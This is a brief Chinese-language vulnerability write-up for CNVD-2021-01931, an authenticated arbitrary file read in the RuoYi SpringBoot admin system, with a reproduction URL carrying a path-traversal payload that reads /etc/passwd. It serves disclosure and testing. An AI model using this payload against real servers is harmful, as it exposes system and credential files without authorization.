# 若依管理系统 后台任意文件读取 CNVD-2021-01931

## 漏洞描述
若依管理系统是基于SpringBoot的权限管理系统,登录后台后可以读取服务器上的任意文件

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录后台后访问 Url

https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd



![](images/202202101959920.png)



